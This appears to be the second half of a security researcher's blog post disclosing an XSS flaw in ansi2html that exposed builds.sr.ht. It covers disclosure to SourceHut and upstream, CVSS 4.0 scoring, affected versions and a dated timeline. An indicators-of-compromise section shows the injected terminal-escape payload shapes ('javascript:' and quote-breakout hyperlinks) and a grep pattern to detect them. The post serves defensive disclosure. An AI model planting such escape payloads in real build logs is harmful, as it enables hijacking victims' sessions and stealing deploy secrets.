+<h2 id="contact">Contact<a hidden class="anchor" aria-hidden="true" href="#contact">#</a></h2>
+<p>I immediately emailed <a href="mailto:~sircmpwn/sr.ht-security@lists.sr.ht">~sircmpwn/sr.ht-security@lists.sr.ht</a>
+explaining the entire problem, complete with a fix that mitigated the worst part at least.</p>
+<p>Drew (can I call you Drew? I guess we are all brothers in Source)
+ended up patching builds.sr.ht to auto-sanitize the output from ansi2html instead.
+Also a good choice.</p>
+<h2 id="upstream">Upstream<a hidden class="anchor" aria-hidden="true" href="#upstream">#</a></h2>
+<p>Then I contacted upstream (maybe a bit too late? exact timeline below).
+Ansi2html is one of the projects
+<a href="https://is.gd/WVZvnI">featured in the famous and by now beaten to death comic strip by Randall Munroe</a>.<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup>
+Placed under pycontribs org on GitHub, which ominously states:</p>
+<blockquote>
+<p>PyContribs main purpose is to assure that different Python-related projects remain maintained.</p>
+</blockquote>
+<p>I reached out to the two top people from last 5 or so years&rsquo; worth of contributor graph, emails from git history,
+in order not to make the issue public yet, although it was already made public by the SourceHut announcement.</p>
+<p>The maintainer I believed to be the &lsquo;main&rsquo; one (<a href="https://github.com/ssbarnea">Sorin Sbarnea</a>)
+has not replied to date (he might be having some kind of holiday),
+although the other one (<a href="https://github.com/hartwork">Sebastian Pipping</a>) has.
+And the message was a cryptic, unusual for me to receive, &lsquo;mail me in two weeks&rsquo;.</p>
+<p>So I patiently waited two weeks, minding my another nascent business (let me try, okay?),
+and sent the email.</p>
+<h2 id="helping-upstream">Helping upstream<a hidden class="anchor" aria-hidden="true" href="#helping-upstream">#</a></h2>
+<p>It turned out that Sebastian (can I call you Sebastian?)
+is a cool guy and he figured he needed me to help him
+because of something with ACLs on the repo.
+We ended up getting ansi2html up from the suspension it was in, updating some obsolete scripts,
+and releasing like 3 or 4 versions of ansi2html to PyPI together.</p>
+<p>I tried to be helpful, but had some things going on with my PhD-in-spe,
+so some latency crept in.</p>
+<h2 id="submitting-for-a-cve">Submitting for a CVE<a hidden class="anchor" aria-hidden="true" href="#submitting-for-a-cve">#</a></h2>
+<p>Let&rsquo;s start with the hot take that CVSS scoring is a fallacy:
+it should be separate for each product
+and not just one for one root cause code path.</p>
+<p>The purpose of CVSS is after all to provide useful information to downstream users
+on whether to go patch it or not.
+Researchers have the incentive to make it as high as possible.
+And projects have the incentive to downplay it.
+They do want to fix it, but they want to avoid the paperwork involved,
+and the confidentiality dance of passing it all around (and I totally get it!).</p>
+<p>The problem is, not all software is born equal, and <a href="https://daniel.haxx.se/blog/2025/01/23/cvss-is-dead-to-us/">this is especially the case with libraries like libcurl</a>.</p>
+<p>CVSS 4.0 is at least a bit better than CVSS 3.x.
+It now makes a distinction on Vulnerable System and Subsequent System.
+In case of XSS vulnerabilities the typical approach is to say that the web service is Vulnerable,
+and the browser is Subsequent
+(which kind of makes sense,
+because the bug is in the service,
+but then it impacts the victim browser first
+in order to attack the web service itself again).</p>
+<p><a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N/AU:Y/R:I/V:C/RE:L/U:Red">The vector I initially came up with</a> has been altered by VulnCheck.
+Not sure why, but maybe it can be changed back? Or maybe not worth bothering.
+Let me know what you think.
+I also want to add this blog post to the CVE DB, but I might need to check how to do it.</p>
+<!-- raw HTML omitted -->
+<ul>
+<li>AV:N - attack vector: network</li>
+<li>AC:L - attack complexity: low (no guesswork required, no need to bypass or synchronize attacks)</li>
+<li>AT:N - requirements: none (as opposed to specific config required)</li>
+<li>PR:N - privileges required: none (just send an email? it might also be low if there was no lists.sr.ht)</li>
+<li>UI:P - user interaction: passive (the victim must visit a site with JS on - the only problem, easy to solve)</li>
+</ul>
+<p>vulnerable system (builds.sr.ht / all of sr.ht)</p>
+<ul>
+<li>VC:H - confidentiality impact: high (does cause a direct, serious loss of confidentiality - secrets get exposed)</li>
+<li>VI:H - integrity impact: high (can submit malicious build jobs as victim with access to deploy keys)</li>
+<li>VA:N - availability impact: none (cannot take down the whole service, unless clogging build workers counts)</li>
+</ul>
+<p>subsequent system (victim browser)</p>
+<ul>
+<li>SC:L - confidentiality: low (limited access to tightly scoped secrets)</li>
+<li>SI:L - integrity: low (ability to forge tightly scoped requests)</li>
+<li>SA:N - availability: none (nothing more than from a direct visit)</li>
+</ul>
+<p>supplemental</p>
+<ul>
+<li>AU:Y - automatable: yes (wormable - a victim can attack others right away, spreading the scope)</li>
+<li>R:I - recovery: irrecoverable (users cannot delete build jobs, only hide them)</li>
+<li>V:C - value density: concentrated (a single instance hosts many valuable projects with valuable deploy secrets)</li>
+<li>RE:L - response effort: low (basic mitigation: CSP header insertion at proxy level)</li>
+<li>U:Amber - urgency: amber (moderate urgency: poses direct danger to infra but has been sitting there for years)</li>
+</ul>
+<!-- raw HTML omitted -->
+<p>While the exact impact can and should be disputed by actual users
+(after all, SourceHut boasts working just fine <em>without</em> javascript),
+I would argue for high or critical, not just a mere medium,
+because if I were a blackhat,
+it would suffice that Drew visited an affected build log with JS turned on,
+and I could submit a build job in his name with access to SourceHut deploy keys.
+Not sure how I would turn that into money or get away with it though.
+Don&rsquo;t do this, kids. No excitement justifies it.</p>
+<h2 id="vulnerabile-versions">Vulnerabile versions<a hidden class="anchor" aria-hidden="true" href="#vulnerabile-versions">#</a></h2>
+<p><code>ansi2html &gt;=1.7.0, &lt;1.9.4</code>, <code>builds.sr.ht &gt;= 0.40.0, &lt; 0.105.1</code></p>
+<h2 id="indicators-of-compromise">Indicators of compromise<a hidden class="anchor" aria-hidden="true" href="#indicators-of-compromise">#</a></h2>
+<p>Check your raw build logs for <code>␛]8;;https://example.com/&quot;/...␇</code> or <code>␛]8;;javascript:...␇</code>.
+In Bash, that would probably be something along <code>grep $'\33]8;[^\7\33]*&quot;'</code> for the former.</p>
+<h2 id="full-timeline-glad-to-have-permanent-records-on-everything">Full timeline (glad to have permanent records on everything!)<a hidden class="anchor" aria-hidden="true" href="#full-timeline-glad-to-have-permanent-records-on-everything">#</a></h2>
+<p>I&rsquo;m not so proud of this timeline, but hey, at least everything is fixed now and there are no (?) records of people trying to use it.
+I will include the official Arch Linux repo and the sr.ht Alpine Linux repo, because both systems were recommended at one point.</p>
+<ul>
+<li>2019-03-11: <a href="https://git.sr.ht/~sircmpwn/builds.sr.ht/commit/ad7fc189ccba57256552f2e021d765c57ce010b0">ansi2html gets added to builds.sr.ht</a>
+and <a href="https://git.sr.ht/~sircmpwn/sr.ht-apkbuilds/commit/a8017ef5fec8c3fe33f335fc86d157738ede85b3">then to sr.ht-apkbuilds</a></li>
+<li>2021-09-03: <a href="https://github.com/pycontribs/ansi2html/commit/d5d95551ba3623686ac9ce3b08cf493f6e0789db">the bug gets introduced to upstream ansi2html</a></li>
+<li>2022-02-08: <a href="https://git.sr.ht/~sircmpwn/sr.ht-apkbuilds/commit/82f7e5353d40e92a057295af09b68fdba27eb1cc">an affected version gets packaged for Alpine and goes live on the flagship instance</a></li>
+<li>2022-07-10: <a href="https://gitlab.archlinux.org/archlinux/packaging/packages/python-ansi2html/-/commit/e5c34c539e24ea62ab778a840789897751d65ac5">an affected version is packaged for Arch Linux</a></li>
+<li>2026-07-17: I maybe buy some domains<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup></li>
+<li>2026-07-31: I start working on SourceHut</li>
+<li>2026-08-01: I submit <a href="https://github.com/pycontribs/ansi2html/issues/259">the issue</a>, and <a href="https://github.com/pycontribs/ansi2html/pull/260">the PR fixing the TrueColor bug</a> to ansi2html upstream.
+I prepare a preliminary patch for ansi2html and send it to <a href="mailto:~sircmpwn/sr.ht-security@lists.sr.ht">~sircmpwn/sr.ht-security@lists.sr.ht</a>.</li>
+<li>2026-08-04: <a href="https://git.sr.ht/~sircmpwn/builds.sr.ht/commit/d768f9edd4b527d3e184b138e1d53f2d3fab7677">the bug gets mitigated in builds.sr.ht code</a>;
+I receive an email from Drew DeVault confirming the vulnerability.
+<a href="https://lists.sr.ht/~sircmpwn/sr.ht-admins/%3CDKFZYH5E7NRP.3S5TGB068189R@ddevault.org%3E">Drew gives me a public shoutout</a> (thanks! I appreciate it!).</li>
+<li>2026-08-06: bug reported upstream, ACKed immediately</li>
+<li>2026-08-20: pinging upstream</li>
+<li>2026-08-22: Sebastian replies, we set up when to work on it</li>
+<li>2026-08-24: trying to oil ansi2html CI together before we can proceed to address the actual vulnerability</li>
+<li>2026-08-29: version 1.9.3 published, not fixing the vulnerability</li>
+<li>2026-08-31: I hint in a post that I am working on <a href="https://hub.copyleft.market">a software forge that pays project owners</a></li>
+<li>2026-09-02: <a href="https://github.com/pycontribs/ansi2html/pull/263">PR with the final fix pushed</a> and 1.9.4 published, fixing the vulnerability</li>
+<li>2026-09-05: <a href="https://gitlab.archlinux.org/archlinux/packaging/packages/python-ansi2html/-/commit/775cf971799e445bc07ae133b1e2b7d312ba71ed">Arch Linux updates ansi2html to a fixed version</a></li>
+<li>2026-09-xx: Life happens, I took a bit more work to sustain myself</li>
+<li>2026-09-23: This blog post (actually -09-24 because it&rsquo;s past midnight by now. sigh.)</li>
+<li>2077-??-??: Profit&hellip;?</li>
+</ul>
+<p>Note how even carefully auditing ansi2html would not save SourceHut, unless redone on every bump.
+builds.sr.ht remained vulnerable for (almost exactly) 4,5 years.</p>
+<h2 id="thanks">Thanks<a hidden class="anchor" aria-hidden="true" href="#thanks">#</a></h2>
+<p>God for keeping the blackhat temptations away.  Danonek123 for keeping me company.  I love you.</p>
+<h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
+<p>See, vulnerability research does not need to be a circus,
+or security theatre, or a lawyered-up fight against bureaucracy.
+But then you might not end up better off.</p>
+<p>Excluding CTFs &amp; invitations to minor conferences
+(and being allowed to do some VR as part of my internship
+back when at <a href="https://antmicro.com">Antmicro</a>,
+which I am still grateful for),
+I have made a metric 0.00€ (that&rsquo;s $0.00 Fahrenheit)
+from my vulnerability research so far.
+If you want to support me (so that I have more time for VR),
+consider buying something.
+I like it better than donations (though they are fine too!).
+I&rsquo;m also available for professional security consulting.</p>
+<p>I&rsquo;m not done! There&rsquo;s more coming, although arguably not so critical.
+Subscribe to my RSS if you don&rsquo;t want to miss it.</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>Or at least provide some optional ultra-simple <code>configure</code> script
+that allows to just run <code>make install</code>/<code>ninja install</code>
+so that other people can package it easily.
+(By the way, I still can&rsquo;t get it why people use AppImage instead of just a static binary.)&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p>You can still probably send your patches
+if you want to host your sr.ht on Arch!&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p>Hey Drew/Conrad/Simon/(sorry if I missed someone!),
+when you update ansi2html in sr.ht-apkbuilds,
+actually when you first restart builds.sr.ht after that,
+please measure the bandwidth impact on builds.sr.ht.
+I will make sure to link it here.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:4">
+<p>Yes, that&rsquo;s an em dash. I use Polish typography here, because I have no editor to answer to.
+Feel free to correct me, though. You can be my drive-by editor.&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:5">
+<p>Oops, sorry, wrong link. I&rsquo;m talking about <a href="https://xkcd.com/2347/">https://xkcd.com/2347/</a> of course.&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:6">
+<p>Totally not an impulse buy. &lsquo;To get a sense of being invested.&rsquo; I tell to myself.&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://blog.arusekk.pl/">Arusekk blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
